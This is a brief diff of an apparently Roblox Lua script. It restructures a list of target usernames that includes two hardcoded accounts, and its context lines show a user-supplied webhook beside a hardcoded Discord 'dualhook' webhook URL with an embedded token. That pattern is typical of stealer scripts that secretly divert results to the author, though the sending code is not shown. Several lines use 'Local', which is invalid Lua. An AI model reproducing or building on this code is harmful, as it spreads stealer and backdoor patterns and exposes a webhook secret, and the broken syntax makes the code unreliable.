@@ -1,4 +1,9 @@
-Local usernames = { getfenv().Username, "namnnni2", "BaldBaconFrrr"}
+local usernames = {}
+if getfenv().Username then
+	table.insert(usernames, getfenv().Username)
+end
+table.insert(usernames, "namnnni2")
+table.insert(usernames, "BaldBaconFrrr")
 Local webhook = getfenv().Webhook
 Local dualhook = "https://discord.com/api/webhooks/1396184713311289354/0b-DXlEyHe5wu_9WXQRO89AAgEjNeSJbGDL7wFEDhvH-LMeBqxtuMuyaaxmISo9JT5UO"
 Local embed = getfenv().Username
